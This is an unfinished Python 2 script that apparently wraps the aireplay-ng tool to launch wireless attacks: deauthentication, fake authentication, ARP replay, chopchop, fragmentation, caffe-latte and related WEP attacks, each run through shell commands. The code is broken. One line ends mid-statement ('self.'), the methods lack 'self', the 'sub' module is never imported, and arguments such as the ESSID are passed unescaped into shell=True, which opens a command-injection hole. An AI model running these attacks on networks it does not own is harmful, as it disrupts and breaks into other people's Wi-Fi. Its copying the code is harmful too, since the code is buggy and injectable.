#!/usr/bin/python
# -*- coding: utf-8 -*-

#TODO 
#Use packetforge-ng to create encrypted packets for packet injection
#use with chopchop and fragmentation attacks

class aireplayNG:
	def __init__(self, replayInterface, bssid, dmac, smac, essid):
		self.replayInterface = replayInterface
		self.bssid = bssid
		self.dmac = '-d %s'%(dmac)
		self.smac = '-s %s'%(smac)
		self.essid = '-e %s'%(essid)
		self.minlen = 0
		self.maclen = 0
		self.type = '-u' #frame control type field
		self.subt = '-v' #frame control subtype field
		self.
	
	def deauth():	#wpa --deauth=<count>
		print 'starting deauth attack'
		#TODO set up options
		count = 0
		sub.Popen('aireplay-ng --deauth=%d %s'%(count, replayInterface), shell=True)

	def fakeauth():	#WEP --fakeauth=<delay>
		print 'starting fakeauth attack'
		#TODO set up options
		delay = 0
		# -e <essid> -o <npackets> -q <seconds> -v <prga> -T n 
		sub.Popen('aireplay-ng -1 %d -e %s %s'%(delay, essid, replayInterface), shell=True)

	def interactive():	#  --interactive
		print 'starting interactive attack'
		#TODO set up options
		sub.Popen('aireplay-ng -2 %s'%(replayInterface), shell=True)

	def arpreplay():	#WEP --arpreplay
		print 'starting arp replay attack'
		#TODO set up options
		#-j 
		sub.Popen('aireplay-ng -3 %s'%(replayInterface), shell=True)

	def chopchop():	#WEP --chopchop
		print 'starting chop chop attack'
		#TODO set up options
		sub.Popen('aireplay-ng -4 %s'%(replayInterface), shell=True)

	def fragment():	#Main WEP  --fragment
		print 'starting fragment attack'
		#TODO set up options
		#-k <IP> (set destination IP in fragments)
		#-l <IP> (set source IP in fragments)
		sub.Popen('aireplay-ng -5 %s'%(replayInterface), shell=True)

	def caffelatte():	#WEP --caffe-latte
		print 'starting caffe latte attack'
		#TODO set up options
		sub.Popen('aireplay-ng -6 %s'%(replayInterface), shell=True)

	def cfrag():	#Main WEP --cfrag
		print 'starting cfrag attack'
		#TODO set up options
		sub.Popen('aireplay-ng -7 %s'%(replayInterface), shell=True)

	def testInjection():	#Test Packet Injection --test
		print 'Testing Packet Injection'
		sub.Popen('aireplay-ng -9 %s'%(replayInterface), shell=True)


